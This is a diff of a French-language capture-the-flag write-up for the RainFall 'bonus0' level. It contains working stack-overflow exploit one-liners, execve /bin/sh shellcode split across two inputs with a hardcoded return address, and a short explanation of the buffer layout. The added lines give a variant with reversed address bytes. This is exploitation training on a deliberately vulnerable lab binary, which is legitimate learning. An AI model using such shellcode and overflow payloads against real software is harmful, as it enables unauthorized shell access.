@@ -77,3 +77,6 @@ bonus0@RainFall:~$ ((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\
 ((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9')"); (python -c "print('\x89\xca\xcd\x80' + 't' * 5 + '\x26\xf7\xff\xbf' + 'c' * 20)"); cat) | ./bonus0
 
 On ecrit notre shellcode dans le buffer qui ne se reset pas, 20 octets pour la premiere chaine (ne pas mettre de /n ou de 0) puis les 4 premier octets de la seconde pour finir notre shellcode, on ajoute 5 octets random pour acceder a l adresse de eip (next instruction de la stack) pour pouvoir jmp au debut de notre shellcode puis x random caractere pour que notre seconde chaine fasse au minimum 20 caracteres (x > 6 pour faire au minimum 20 caracteres && x < (buffermax = 4096 - le nombre deja ecrit))
+
+
+((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9')"); (python -c "print('\x89\xca\xcd\x80' + 't' * 5 + '\xbf\xff\xf7\x26'[::-1] + 'c' * 20)"); cat) | ./bonus0
